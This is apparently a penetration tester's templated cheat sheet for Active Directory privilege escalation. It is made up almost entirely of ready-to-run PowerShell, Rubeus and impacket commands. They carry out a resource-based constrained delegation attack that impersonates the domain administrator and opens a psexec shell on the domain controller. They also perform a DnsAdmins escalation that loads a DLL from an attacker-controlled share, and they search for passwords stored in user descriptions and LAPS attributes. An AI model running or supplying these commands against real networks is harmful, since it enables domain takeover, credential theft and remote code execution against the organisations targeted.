
## Generating & using tickets 

Used when a user or group has GenericAll on the _computer_ object, eg. DC. 
Needs powerview, powermad, rebeus. 

```PowerShell
. .\PowerView.ps1
. .\Powermad.ps1
Get-DomainObject -Identity 'DC={{DOMAIN_NB}},DC=LOCAL' | select ms-ds-machineaccountquota
Get-DomainController | select name,osversion | fl
Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl

New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)
$fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid
$fakesid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl

.\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:{{DOMAIN}}
.\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/{{COMPUTER_NAME}} /ptt
```

```bash
impacket-addcomputer -computer-name 'testprivesc$' -computer-pass test -dc-ip {{DC_IP}} {{DOMAIN_NB}}/{{USERNAME}}:{{PASSWORD}}
impacket-rbcd -action write -delegate-from 'testprivesc$' -delegate-to 'DC$' -dc-ip {{DC_IP}} '{{DOMAIN_NB}}/{{USERNAME}}:{{PASSWORD}}'
impacket-getST -spn 'cifs/DC.{{DOMAIN}}' -impersonate Administrator -dc-ip {{DC_IP}} '{{DOMAIN}}/testprivesc$:test'
```

Copy last ticket at the bottom of output and save as ticket.kirbi.b64 

```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache impacket-psexec {{DOMAIN}}/administrator@{{COMPUTER_NAME}} -k -no-pass
```


## Getting user groups, properties, other weird stuff

```PowerShell
whoami /groups 
cmd /c dnscmd localhost /config /serverlevelplugindll \\{{LHOST}}\share\dns.dll
sc.exe stop dns # then start 

Get-ADUser -identity {{USERNAME}} -properties *
Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName={{USERNAME}}) (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *

Get-ADUser -Filter "ScriptPath -like '*'" -Properties ScriptPath | Select-Object Name, SamAccountName, ScriptPath
Get-ADUser -Filter "description -like '*password*' -or description -like '*Welcome*'" -Properties description | Select-Object Name, SAMAccountName, Description | Format-Table -AutoSize
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
```
